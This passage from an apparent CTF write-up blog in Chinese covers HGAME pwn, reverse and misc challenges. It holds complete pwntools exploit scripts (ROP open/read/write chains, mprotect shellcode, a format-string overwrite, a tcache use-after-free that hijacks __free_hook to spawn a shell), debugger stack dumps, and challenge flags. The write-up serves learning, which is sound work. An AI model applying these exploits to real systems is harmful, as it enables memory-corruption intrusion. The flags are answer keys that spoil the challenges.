class="hljs-number">0x0000000000023b6a</span><br>rsi = base + <span class="hljs-number">0x000000000002601f</span><br>rdx = base + <span class="hljs-number">0x0000000000142c92</span><br>rax = base + <span class="hljs-number">0x0000000000036174</span>   <span class="hljs-comment"># 返回值</span><br>rsp = base + <span class="hljs-number">0x000000000002f70a</span><br>addr = <span class="hljs-number">0x404500</span><br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>) + p64(addr)<br>payload2 += p64(rax) + p64(addr) + p64(<span class="hljs-number">0x401282</span>)<br>payload2 += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>io.send(payload2)<br><br>payload3 = <span class="hljs-string">b&#x27;./flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload3 += p64(rdi) + p64(addr)<br>payload3 += p64(rsi) + p64(<span class="hljs-number">0</span>) + p64(o)<br>payload3 += p64(rdi) + p64(<span class="hljs-number">3</span>)<br>payload3 += p64(rsi) + p64(addr+<span class="hljs-number">0x300</span>)<br>payload3 += p64(rdx) + p64(<span class="hljs-number">0x50</span>) + p64(read)<br>payload3 += p64(rdi) + p64(<span class="hljs-number">1</span>)<br>payload3 += p64(rsi) + p64(addr+<span class="hljs-number">0x300</span>)<br>payload3 += p64(rdx) + p64(<span class="hljs-number">0x50</span>) + p64(w)<br>payload3 += p64(main)	<br>io.send(payload3)<br><br><br>io.interactive()<br><br><span class="hljs-comment"># &#x27;./flag&#x27;.ljust(8, b&#x27;\x00&#x27;)写最后也行 payload2的addr调整一下</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>这题卡住的原因就是bss没有权限执行shellcode 写rop链就行了<br>修改一下最开始没通的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br><span class="hljs-comment"># io = remote(&quot;139.196.183.57&quot;, 32447)</span><br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;/home/yech0/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;)</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x00000000004013e3</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x40125b</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;accord.\n&#x27;</span>)<br><br>off = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>+<span class="hljs-number">8</span>)<br>payload = off <br>payload += p64(pop_rdi_ret) + p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>io.send(payload)<br><br>puts_addr = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment"># base = puts_addr - (0x7fd0c0aa1420-0x7fd0c0a1d000)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;base&#x27;</span>+<span class="hljs-built_in">hex</span>(base))<br>read = base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>o = base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>w = base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rdi = base + <span class="hljs-number">0x0000000000023b6a</span><br>rsi = base + <span class="hljs-number">0x000000000002601f</span><br>rdx = base + <span class="hljs-number">0x0000000000142c92</span><br>rax = base + <span class="hljs-number">0x0000000000036174</span>   <span class="hljs-comment"># 返回值</span><br>rsp = base + <span class="hljs-number">0x000000000002f70a</span><br>addr = <span class="hljs-number">0x404500</span><br>readtst = <span class="hljs-number">0x401276</span><br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>) + p64(addr) + p64(readtst)<br>io.send(payload2)<br>payload4 = <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x100</span>) + p64(addr+<span class="hljs-number">0x100</span>) + p64(readtst)<br>io.send(payload4)<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br>payload3 = <span class="hljs-string">b&#x27;./flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload3 += p64(rdi) + p64(addr)<br>payload3 += p64(rsi) + p64(<span class="hljs-number">0</span>) + p64(o)<br>payload3 += p64(rdi) + p64(<span class="hljs-number">3</span>)<br>payload3 += p64(rsi) + p64(addr+<span class="hljs-number">0x300</span>)<br>payload3 += p64(rdx) + p64(<span class="hljs-number">0x50</span>) + p64(read)<br>payload3 += p64(rdi) + p64(<span class="hljs-number">1</span>)<br>payload3 += p64(rsi) + p64(addr+<span class="hljs-number">0x300</span>)<br>payload3 += p64(rdx) + p64(<span class="hljs-number">0x50</span>) + p64(w)<br>payload3 += p64(main)	<br>io.send(payload3)<br><br><br>io.interactive()<br></code></pre></td></tr></table></figure>
</li>
<li><p>另一种方法：mprotect函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br><span class="hljs-comment"># io = remote(&quot;139.196.183.57&quot;, 32447)</span><br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;/home/yech0/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;)</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x00000000004013e3</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x40125b</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;accord.\n&#x27;</span>)<br><br>off = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>+<span class="hljs-number">8</span>)<br>payload = off <br>payload += p64(pop_rdi_ret) + p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>io.send(payload)<br><br>puts_addr = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment"># base = puts_addr - (0x7fd0c0aa1420-0x7fd0c0a1d000)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;base&#x27;</span>+<span class="hljs-built_in">hex</span>(base))<br>mprotect = base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>read = base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>rdi = base + <span class="hljs-number">0x0000000000023b6a</span><br>rsi = base + <span class="hljs-number">0x000000000002601f</span><br>rdx = base + <span class="hljs-number">0x0000000000142c92</span><br>rax = base + <span class="hljs-number">0x0000000000036174</span>   <span class="hljs-comment"># 返回值</span><br>rsp = base + <span class="hljs-number">0x000000000002f70a</span><br>addr = <span class="hljs-number">0x404500</span><br>readtst = <span class="hljs-number">0x401276</span><br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>) + p64(addr) + p64(readtst)<br>io.send(payload2)<br>payload4 = <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x100</span>) + p64(addr+<span class="hljs-number">0x100</span>) + p64(readtst)<br>io.send(payload4)<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br>payload3 = p64(<span class="hljs-number">0</span>) + p64(rdi) + p64(<span class="hljs-number">0x404000</span>)<br>payload3 += p64(rsi) + p64(<span class="hljs-number">0x1000</span>)<br>payload3 += p64(rdx) + p64(<span class="hljs-number">7</span>) + p64(mprotect)<br>payload3 += p64(rdi) + p64(<span class="hljs-number">0</span>)<br>payload3 += p64(rsi) + p64(addr) <br>payload3 += p64(rdx) + p64(<span class="hljs-number">0x50</span>) + p64(read)<br>payload3 += p64(addr)<br>io.send(payload3)<br><br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-number">3</span>, addr, <span class="hljs-number">0x50</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>, addr, <span class="hljs-number">0x50</span>)<br>io.send(asm(shellcode))<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
</li>
<li><p>又看到一个师傅的wp能leak出栈地址：即libc的<code>__environ</code>能leak出栈地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">environ = base + libc.sym[<span class="hljs-string">&#x27;__environ&#x27;</span>] <br>p = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x108</span> + p64(pop_rdi_ret) + p64(environ) + p64(puts_plt) + p64(main) <br>io.sendafter(<span class="hljs-string">b&#x27;you an accord.\n&#x27;</span>, p)<br>stack = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1e8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;stack&#x27;</span>+<span class="hljs-built_in">hex</span>(stack))	<span class="hljs-comment"># 写p的起始位置</span><br>gdb.attach(io)<br>pause()<br></code></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h4 id="4-fmt"><a href="#4-fmt" class="headerlink" title="4 fmt"></a>4 fmt</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># fini_arry不能改(Partial RELRO)</span><br><span class="hljs-comment"># 也没有栈溢出 不能chk_fail</span><br><span class="hljs-comment"># 也没有exit(即在printf之后调用的函数)</span><br><span class="hljs-comment"># 只能改返回地址</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br><span class="hljs-comment"># io = remote(&#x27;139.196.183.57&#x27;, 32338)</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>backdoor = <span class="hljs-number">0x40123d</span><br>main = <span class="hljs-number">0x401331</span><br>vuln = <span class="hljs-number">0x401254</span><br>printf_got = <span class="hljs-number">0x404040</span><br><span class="hljs-comment"># 需要改的是给出地址中的内容 也就是说需要给出内容是main（返回地址）的栈地址</span><br><br><span class="hljs-comment"># 10</span><br><span class="hljs-comment"># 19/22/21</span><br><span class="hljs-comment"># io.recv()</span><br>sleep(<span class="hljs-number">0.5</span>)<br>gdb.attach(io)<br><span class="hljs-comment"># pause()</span><br>payload = <span class="hljs-string">b&#x27;%72c%18$hhnaaaaa&#x27;</span>+p64(backdoor)*<span class="hljs-number">6</span><br>io.send(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<ul>
<li><p>这个是晨曦师傅的wp <del>mad官方也没发这题的wp</del><br>将offset为18的位置的二级指针修改 让返回地址为sys(中的一个就欧克)</p>
<blockquote>
<p><strong>其实格式化字符串修改的都是二级指针</strong> 只是之前我们修改的是指定地址的<br>如strfmt_payload(10, {printf_got : system})<br>    在函数栈中的结构为：栈地址 –&gt; got表地址（0x404040）–&gt; printf的真实地址（0x7f…）<br>    修改的就是printf的真实地址 也是二级指针</p>
</blockquote>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">stack 40</span><br>00:0000│ rsp 0x7ffc0dbb3f20 ◂— &#x27;make strings and getshell\n&#x27;<br>01:0008│     0x7ffc0dbb3f28 ◂— &#x27;ings and getshell\n&#x27;<br>02:0010│     0x7ffc0dbb3f30 ◂— &#x27; getshell\n&#x27;<br>03:0018│     0x7ffc0dbb3f38 ◂— 0xa6c /* &#x27;l\n&#x27; */<br>04:0020│ rdi 0x7ffc0dbb3f40 ◂— 0x2438312563323725 (&#x27;%72c%18$&#x27;)<br>05:0028│     0x7ffc0dbb3f48 ◂— 0x61616161616e6868 (&#x27;hhnaaaaa&#x27;)<br>06:0030│     0x7ffc0dbb3f50 —▸ 0x40123d (sys) ◂— endbr64 <br>... ↓        5 skipped<br>0c:0060│     0x7ffc0dbb3f80 —▸ 0x7ffc0dbb3fa0 —▸ 0x7ffc0dbb3fc0 ◂— 0x1		# offset=18<br>0d:0068│     0x7ffc0dbb3f88 —▸ 0x7ffc0dbb40d8 —▸ 0x7ffc0dbb63ac ◂— 0x53006e6c75762f2e /* &#x27;./vuln&#x27; */<br>0e:0070│     0x7ffc0dbb3f90 ◂— 0x0<br>0f:0078│     0x7ffc0dbb3f98 ◂— 0x697d0efaef5a6200<br>10:0080│ rbp 0x7ffc0dbb3fa0 —▸ 0x7ffc0dbb3fc0 ◂— 0x1<br>11:0088│     0x7ffc0dbb3fa8 —▸ 0x401369 (main+60) ◂— mov eax, 0<br>12:0090│     0x7ffc0dbb3fb0 ◂— 0x0<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">tele 0x7ffc0dbb3f20 40</span><br>00:0000│     0x7ffc0dbb3f20 ◂— &#x27;make strings and getshell\n&#x27;	<br>01:0008│     0x7ffc0dbb3f28 ◂— &#x27;ings and getshell\n&#x27;<br>02:0010│     0x7ffc0dbb3f30 ◂— &#x27; getshell\n&#x27;<br>03:0018│     0x7ffc0dbb3f38 ◂— 0xa6c /* &#x27;l\n&#x27; */<br>04:0020│     0x7ffc0dbb3f40 ◂— 0x2438312563323725 (&#x27;%72c%18$&#x27;)	# offset=10<br>05:0028│ rbp 0x7ffc0dbb3f48 ◂— 0x61616161616e6868 (&#x27;hhnaaaaa&#x27;)<br>06:0030│     0x7ffc0dbb3f50 —▸ 0x40123d (sys) ◂— endbr64 <br>... ↓        5 skipped<br>0c:0060│     0x7ffc0dbb3f80 —▸ 0x7ffc0dbb3fa0 —▸ 0x7ffc0dbb3f48 ◂— 0x61616161616e6868 (&#x27;hhnaaaaa&#x27;)	# 18<br>0d:0068│     0x7ffc0dbb3f88 —▸ 0x7ffc0dbb40d8 —▸ 0x7ffc0dbb63ac ◂— 0x53006e6c75762f2e /* &#x27;./vuln&#x27; */<br></code></pre></td></tr></table></figure>

<h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><h4 id="ezIDA"><a href="#ezIDA" class="headerlink" title="ezIDA"></a>ezIDA</h4><ul>
<li>直接ida打开附件就能看到flag</li>
</ul>
<h4 id="ezASM"><a href="#ezASM" class="headerlink" title="ezASM"></a>ezASM</h4><ul>
<li><p>好好好 gpt这么不靠谱 异或0x22算不对<br>多用用python计算把 </p>
</li>
<li><blockquote>
<pre><code class="python">a = [74, 69, 67, 79, 71, 89, 99, 113, 111, 125, 107, 81, 125, 107, 79, 82, 18, 80, 86, 22, 76, 86, 125, 22, 125, 112, 71, 84, 17, 80, 81, 17, 95, 34]
for i in a:
   print(chr(i^0x22), end=&#39;&#39;)
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>* ```<br> hgame&#123;ASM_Is_Imp0rt4nt_4_Rev3rs3&#125;<br></code></pre></td></tr></table></figure>
</code></pre>
</blockquote>
</li>
</ul>
<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><ul>
<li>公众号</li>
</ul>
<h4 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h4><ul>
<li><p>图片 也提示了换一种视角 </p>
</li>
<li><blockquote>
<p><a target="_blank" rel="noopener" href="https://lab.magiconch.com/xzk/">https://lab.magiconch.com/xzk/</a></p>
<p>斜着看⽣成器 - 神奇海螺⽣成器</p>
<ul>
<li>将图片压扁就能看出来的</li>
</ul>
</blockquote>
</li>
<li><p>用ps图像-&gt;图像大小-&gt;把高度减小就行</p>
</li>
<li><pre><code class="hljs">hgame&#123;WOW_GREAT_YOU_SEE_IT_WONDERFUL&#125;
</code></pre>
</li>
</ul>
<h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn"></a>pwn</h3><h4 id="Elden-Ring-Ⅱ"><a href="#Elden-Ring-Ⅱ" class="headerlink" title="Elden Ring Ⅱ"></a>Elden Ring Ⅱ</h4><ul>
<li><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241316">https://www.anquanke.com/post/id/241316</a></p>
</blockquote>
直接对着这个文章  没怎么调就出了 对大师傅们来说就板子题 白给的 但我还是差不多是第一次做2.31的<br>(而且libc也没出什么问题 有点子丝滑的)</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 2.31 cache uaf 改got表</span><br><span class="hljs-comment"># 突然发现这个没改got表 也是打hook的(2.31还是可以打free_hook的</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&quot;./vuln&quot;)</span><br>io = remote(<span class="hljs-string">&quot;139.196.183.57&quot;</span>, <span class="hljs-number">32225</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">indx, size</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>	io.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">indx</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">indx, content</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>	io.sendlineafter(<span class="hljs-string">&quot;Content: &quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">indx</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">7</span>):<br>	add(i, <span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x10</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">7</span>):<br>	delete(i)<br>delete(<span class="hljs-number">7</span>)<br>show(<span class="hljs-number">7</span>)<br>unsorted = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base = unsorted - <span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook = base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system))<br><br>edit(<span class="hljs-number">6</span>, p64(free_hook))<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x80</span>)<br>edit(<span class="hljs-number">10</span>, p64(system))<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">11</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>delete(<span class="hljs-number">11</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">hgame</span><span class="hljs-template-variable">&#123;efe01dae79f12a6a269998df72444988fbd2b642&#125;</span><br></code></pre></td></tr></table></figure>

<h4 id="fastnote"><a href="#fastnote" class="headerlink" title="fastnote"></a>fastnote</h4><ul>
<li><p>2.31_9.14 全绿 size有问题 但没看出来怎么绕过</p>
</li>
<li><p><del>好好好 晨曦师傅真的6 直接找2023的hgame 题基本都一样</del></p>
</li>
<li><p>我去 牛的 这里指针没有清零的 但是我没看出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">delete</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> id; <span class="hljs-comment">// [rsp+Ch] [rbp-14h] BYREF</span><br>  <span class="hljs-type">void</span> *ptr; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index: &quot;</span>);<br>  __isoc99_scanf(<span 